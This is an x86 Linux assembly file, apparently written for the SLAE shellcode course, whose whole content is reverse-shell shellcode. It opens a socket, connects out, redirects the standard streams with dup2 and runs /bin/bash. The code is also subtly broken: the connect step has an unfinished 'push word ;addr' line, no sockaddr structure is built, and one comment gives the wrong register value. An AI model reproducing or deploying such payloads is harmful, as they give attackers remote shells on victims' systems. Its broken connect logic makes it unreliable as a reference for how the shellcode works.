; Filename: reverse.nasm
; Author:   Jake
; Website:  http://github.com/14deep
; Purpose:  Reverse shell shellcode for Linux x86 for the SLAE course


global _start			

section .text
_start:

	;Clearing the registers
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
	xor esi, esi

	;Socket Calls
        ;In reverse order, pushing each value to the stack:

	;Socket - creating the socket
	push eax     ; Pushing 0 for the Protocol parameter required
	push 0x1     ; Pushing 1 for the Type (SOCK_STREAM) parameter required
	push 0x2     ; Pushing 2 for the Domain (IF_INET) parameter required
	
	mov al, 0x66 ; Adding syscall for socketcall() to eax
	mov bl, 0x1  ; 0x1 is added to bx for the socketcall parameter 'socket'

		     ; At this point, eax is set to 0x66 for the socketcall
		     ; syscall, ebx is set to 0x1 for the socket parameter
		     ; and ecx will contain the values that were pushed to 
		     ; the stack. 

	mov ecx, esp ; Moving the pointer to the stack into ecx for the final
		     ; parameters

	int 0x80     ; Interupt to call the syscall

	mov edx, eax ; Moving the File Descriptor return value to edx

    ;Connect - Connect to an external device
    mov al, 0x66 ; For Socketcall
    mov bl, 0x3  ; For Connect
    
    ;need to push values to the stack to satisfy the following:
    ;int connect(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
    
    push word ;addr
    push edx    ; Pushing the FD to the stack



	push 0x10    ; Push addrlen to the stack, of the structure below. This is 16 bytes
	push ecx     ; The stack pointer 
	push edx     ; File Descriptor from socket call
	
	mov ecx, esp ; The previous value of ecx was pushed to the stack a few instructions before, this updates
		     ; ecx with the current stack pointer to the values previously pushed to the stack. 

	int 0x80     ; Interupt to call the syscall



	;dup2 - duplicate the file descriptor to redirect the incoming connection 
	;Note - this could be looped if required

	mov al, 0x3f  ; Syscall for dup2
	mov ebx, edx  ; Moving the old FD into ebx
	mov ecx, esi  ; Moving 0 into ecx for 'stdin'
	int 0x80      ; Interupt to call the syscall

	mov al, 0x3f
   	inc ecx       ; Increment ecx so it is now 2
    	int 0x80      ; Interupt to call the syscall

	mov al, 0x3f
	inc ecx       ; Increment ecx so it is now 2
    	int 0x80      ; Interupt to call the syscall
	


	;execve - execute '/bin/bash' to provide a shell

    	xor eax, eax  ; Clearing eax
    	push eax      ; Pushing 0 to the stack

   	; push////bin/bash (12), could be shortened to //bin/sh (8)
    	push 0x68736162
   	push 0x2f6e6962
    	push 0x2f2f2f2f

    	mov ebx, esp ; Move stack pointer pointing to the above to ebx as a parameter (filename)
	
	xor ecx, ecx ; Null pointer for ecx argv
	xor edx, edx ; Null pointer for edx envp

    	mov al, 0xb   ; Moving 11 to eax for execve syscall
    	int 0x80      ; Interupt to call the syscall




